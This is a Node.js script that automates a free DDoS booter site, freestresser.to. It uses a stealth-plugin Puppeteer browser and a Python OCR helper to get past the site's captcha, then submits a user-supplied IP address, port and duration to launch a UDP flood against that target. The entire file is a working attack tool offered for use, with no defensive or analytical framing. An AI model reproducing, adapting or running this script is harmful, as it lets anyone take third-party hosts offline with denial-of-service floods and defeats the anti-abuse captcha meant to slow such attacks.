//Dependencies
const Puppeteer_Stealth = require("puppeteer-extra-plugin-stealth")
const { PythonShell } = require("python-shell")
const Puppeteer = require("puppeteer-extra")
const Is_IP = require("is-ip")

//Variables
const Self_Args = process.argv.slice(2)

var Self = {}

//Configurations
Puppeteer.default.use(Puppeteer_Stealth())

//Functions
Self.captcha_bypasser = async function(){
    return new Promise(resolve =>{
        PythonShell.run("./utils/image_reader.py", null, function(err, result){
            if(err){
                console.log(`Python error detected: ${err}`)
                process.exit()
            }

            setTimeout(function(){
                resolve(result[0])
            }, 1000)
        })
    })
}

Self.remove_advertisement = async function(page){
    await page.waitForSelector("#ads > div > div > div.modal-header > button").catch(()=>{
        return
    })

    return new Promise(async(resolve, reject)=>{
        await page.evaluate(()=>{
            const exit = document.querySelector("#ads > div > div > div.modal-header > button")

            exit.click()
        })

        resolve()
    })
}

Self.main = async function(){
    const browser = await Puppeteer.default.launch({ headless: false, argv: ["--no-sandbox", "--disable-setuid-sandbox"] })
    const page = await browser.newPage()
    
    await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36")
    await page.setViewport({
        width: 800,
        height: 1000
    })

    await page.goto("https://freestresser.to/", { waitUntil: "networkidle0", timeout: 0 })

    const page_content = await page.content()

    if(page_content.indexOf("Ratelimited for another -8 seconds") != -1){
        console.log("You have been limited, please try again later.")
        await browser.close()
        process.exit()
    }

    console.log("[Processing] Checking & closing any advertisements.")
    await Self.remove_advertisement(page)
    console.log("[Finished] Checking & closing any advertisements")

    await page.screenshot({
        path: "image.png",
        clip: {
            x: 250,
            y: 350,
            width: 100,
            height: 100
        }
    })

    console.log("[Processing] Reading the captcha codes, for bypassing.")
    var code = await Self.captcha_bypasser()
    console.log("[Finished] Reading the captcha codes, for bypassing.")

    if(!code.match(/[0-9]{4,}/)){
        console.log("Unable to get the code, something is wrong please try again.")
        await browser.close()
        process.exit()
    }

    code = code.match(/[0-9]{5,}/)[0]

    console.log(`Captcha code found ${code}`)

    await page.type("#host", Self_Args[0])
    await page.type("#port", Self_Args[1])
    await page.type("#time", Self_Args[2])
    await page.type("#captcha", code)
    await page.click("#send")

    await page.waitForSelector("#flood_result").then(async()=>{
        const page_content = await page.content()

        if(page_content.indexOf("Operation Failed Error contacting ajax script, please check your connection and try again. Sometimes refreshing the page solves this problem") != -1){
            console.log("It looks like your internet is slow, please try again later.")
            await browser.close()
            process.exit()
        }

        if(page_content.indexOf("Operation Successful UDP was sent to") != -1){
            console.log(`Stressing to ${Self_Args[0]} has started and will end in ${Self_Args[2]} seconds.`)
            await browser.close()
            process.exit()
        }

        if(page_content.indexOf("Operation Failed Doing some updates on the stresser") != -1){
            console.log("FreeStresser is doing some updates, please try again later.")
            await browser.close()
            process.exit()
        }else{
            console.log("There is something going on, on FreeStresser please try again later.")
            await browser.close()
            process.exit()
        }
    }).catch(async()=>{
        console.log("It looks like your internet is slow, please try again later.")
        await browser.close()
        process.exit()
    })
}

//Main
if(!Self_Args.length){
    console.log("node index.js <ip> <port> <seconds>")
    process.exit()
}

if(!Self_Args[0]){
    console.log("Invalid ip.")
    process.exit()
}

if(!Is_IP(Self_Args[0])){
    console.log("Invalid ip.")
    process.exit()
}

if(!Self_Args[1]){
    console.log("Invalid port.")
    process.exit()
}

if(isNaN(Self_Args[1])){
    console.log("Invalid port, port is not an Int.")
    process.exit()
}

if(!Self_Args[2]){
    console.log("Invalid seconds.")
    process.exit()
}

if(isNaN(Self_Args[2])){
    console.log("Invalid seconds, seconds is not an Int.")
    process.exit()
}

if(Self_Args[2] > 60){
    console.log("Invalid seconds, maximum is 60.")
    process.exit()
}

Self.main()
